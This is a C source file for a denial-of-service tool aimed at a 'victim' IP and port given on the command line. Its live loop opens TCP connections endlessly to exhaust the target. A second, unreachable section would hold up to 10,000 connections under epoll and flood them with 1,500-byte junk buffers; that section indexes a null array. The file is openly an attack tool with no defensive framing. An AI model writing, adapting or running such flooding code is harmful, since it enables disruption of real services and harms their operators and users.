#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#include <sys/socket.h>
#include <sys/time.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <unistd.h>
#include <string.h>
#include <errno.h>

#define MAX_CONN 10000
#define MAX_EVENTS 10000


void make_non_blocking(int fd){

    fcntl(fd, F_SETFL, O_NONBLOCK);

}


void set_addr(struct sockaddr_in *addr, int server_port, char* ip){

    addr->sin_family = AF_INET;
    addr->sin_port = htons(server_port);
    addr->sin_addr.s_addr = inet_addr(ip);

}


int open_client_socket(char* server_ip, int server_port){

    int socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int SOCK_LEN = sizeof(struct sockaddr_in);

    struct sockaddr_in client_addr;

    set_addr(&client_addr, server_port, server_ip);
    connect(socket_fd, (struct sockaddr*) &client_addr, SOCK_LEN);
    make_non_blocking(socket_fd);

    return socket_fd;

}


void check_input(int size, char** args){

    if(size != 3){
        printf("[usage]: %s <ip> <port>\n\n", args[0]);
        printf("IP:\tIp of victim computer.\n");
        printf("PORT:\tPort where victim waits for connections.\n");
        exit(EXIT_FAILURE);
    }

}


int main(int argc, char** argv){

    check_input(argc, argv);

    char* lixo = malloc(sizeof(char) * 1500);
    memset(lixo, 'x', sizeof(char) * 1500);

    int SOCK_LEN = sizeof(struct sockaddr_in);

    char* ip = argv[1];
    int port = atoi(argv[2]);

    int ready_conns;
    int i, j;
    int consumed;
    int* socket_reciclavel = NULL;//malloc(sizeof(int) * MAX_CONN);
    int dummy_socket;

    j = 1;
    while(true){
        open_client_socket(ip, port);
        printf("Established %d connections\n", j);
        j++;
    }

    /* Epoll handler and events */
    int epoll_fd;
    struct epoll_event* events = malloc(sizeof(struct epoll_event) * MAX_EVENTS);

    memset(events, 0, sizeof(struct epoll_event) * MAX_EVENTS);

    /* Epoll configuration */
    epoll_fd = epoll_create(MAX_EVENTS);

    /* Open all connections and add them to the epoll handler */
    for(i = 0; i < MAX_CONN; i++){
        socket_reciclavel[i] = open_client_socket(ip, port);
        printf("Established connection %d\n", i);
        events[i].data.fd = socket_reciclavel[i];
        events[i].events = EPOLLOUT;

        /* Add event descriptor to epoll object */
        epoll_ctl(epoll_fd, EPOLL_CTL_ADD, socket_reciclavel[i], &events[i]);
    }

    /* HAMMER that shit */
    j = 0;
    while(true){
        ready_conns = epoll_wait(epoll_fd, events, MAX_EVENTS, -1);

        for(i = 0; i < ready_conns; i++){
            if(events[i].events & EPOLLOUT){
                /* We can write to socket */
                send(events[i].data.fd, lixo, sizeof(char) * 1500, 0);
                printf("Sent: %zu bytes\n", 1500 * j);
                j++;
            }
        }
    }

    return 0;
}
